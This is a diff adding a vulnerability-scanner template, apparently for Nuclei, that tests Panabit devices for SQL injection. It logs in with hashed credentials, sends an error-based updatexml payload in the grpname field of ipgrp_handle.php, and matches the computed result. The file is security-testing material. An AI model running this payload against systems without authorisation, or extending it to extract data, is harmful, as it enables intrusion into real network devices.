@@ -1,0 +1,39 @@
+id: panabit-ipgrp-handle-sqli
+
+info:
+  name: panabit-ipgrp-handle-sqli
+  author: msk
+  severity: high
+
+
+http:
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        Connection: close
+        Content-Length: 87
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        Accept-Encoding: gzip
+
+        user=05110f8b023d9f2ca362d32a4e371923&mypass=f09052b749115479ca208bad0873b4b8&useldap=0
+      - |
+        POST /flow_direction/ipgrp_handle.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        Connection: close
+        Content-Length: 143
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Cookie: sl-session=HF2MWRCWj2VzITKmg+FTxw==
+        X-Requested-With: XMLHttpRequest
+        Accept-Encoding: gzip
+
+        type=ipgrp_add&grpname=1',(select updatexml(1,concat(0x7e,(111*111)),0)))--+&cloudip=1&devid=0&devname=%E6%89%80%E6%9C%89%E8%AE%BE%E5%A4%87
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body_2,"12321","XPATH syntax")
